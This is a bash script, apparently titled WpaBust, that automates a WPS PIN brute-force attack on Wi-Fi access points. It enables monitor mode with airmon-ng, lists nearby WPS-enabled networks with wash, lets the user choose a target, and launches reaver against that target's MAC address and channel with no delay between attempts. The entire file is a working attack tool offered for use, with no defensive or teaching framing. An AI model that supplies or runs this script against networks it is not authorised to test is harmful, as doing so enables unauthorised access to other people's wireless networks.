#! /bin/bash
#WpaBust is a reaver automation script for kali-linux
#Authors: D4rk50ld13r & gh0std0g
echo ""
echo ""
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
echo "%   D4rk-R34v3r BY: D4rk-50ld13r AND gh0std0g   %"
echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%"
echo ""
echo ""
echo "PRESS ANY KEY TO CONTINUE"
read anykey
clear
 
#CONFIG: Customize the script according to your needs
#The default wireless interface (usually wlan0, wifi0 or ath0)
airmon-ng
echo ""
echo ""
echo "WHICH INTERFACE WOULD YOU LIKE TO USE?"
read DEFAULTIFACE

wireless_interface=$DEFAULTIFACE
 
#The timeout (in seconds) for wash to search for WPS-enabled access points
wash_timeout=15
 
#Flag to allow user to choose target AP
allow_user_choice=1
 
#Delay between attack attempts
reaver_delay=0
 
#Check for root privileges
if (( EUID != 0 )); then
  echo "This script needs root"
  exit 1
fi
 
#Check for required commands
for command in airmon-ng wash reaver
do
  if [[ -z $(which $command) ]]; then
     echo "$command was not found"
     echo "To install $command, you may follow this link"
     echo "http://lmgtfy.com/?q=$command+installation"
     exit 1
  fi
done
 
echo "WARNING: Network connections are about to go down. You may need to re-enable wireless connections manually"
 
#Check available interfaces and close previous monitor interfaces and wireless lan
for interface in $(ifconfig | tr -s [:space:] | cut -f1 -d" " | tr -s [:space:])
do
  if [[ -n $(echo $interface | grep "^mon*") ]] || [[ -n $(echo $interface | grep '0$') ]] && [[ $(echo $interface) != "eth0" ]]; then
    echo "* Shutting down $interface"
    airmon-ng stop $interface > /dev/null
  fi
done
 
echo "* Starting a new monitor interface mon0"
airmon-ng start $wireless_interface > /dev/null
 
echo "Identifying WPS-enabled access points"
timeout $wash_timeout wash -i mon0 --ignore-fcs > washOutput.txt
APs=$(cat washOutput.txt | tail -n +3 | tr -s ' ' | cut -f6 -d' ')
 
if [[ -n $(echo $APs) ]]; then
   if  (( $allow_user_choice )); then
      n=1
      echo "The following access points were detected"
      for ap in $APs
      do
        echo "* $n: $ap"
        ((n++))
      done
      read -p "Enter your choice: " choice
      if [[ $choice -le $n ]]; then
        chosen_ap=$(echo "${APs}" | head -$choice | tail -1)
echo "You have chosen $chosen_ap"
      else
echo "Invalid choice!"
exit 1
      fi
   else
      chosen_ap=$(echo "${APs}" | head -n1)
      echo "Proceeding with choice 1: $chosen_ap"
   fi
   tempLine=$(cat washOutput.txt | grep $chosen_ap | tr -s ' ')
   rm washOutput.txt
   channel=$(echo $tempLine | cut -f2 -d' ')
   mac_address=$(echo $tempLine | cut -f1 -d' ')
   echo "Starting reaver"
   echo "reaver -a -S -vv -c $channel -i mon0 -b $mac_address -d $reaver_delay"
   echo "AP name: $chosen_ap"
   echo "Channel: $channel"
   echo "MAC Address: $mac_address"
   reaver -a -S -vv -c $channel -i mon0 -b $mac_address -d $reaver_delay
else
   echo "No networks found. Consider increasing the wash timeout. Terminating"
   exit 1
fi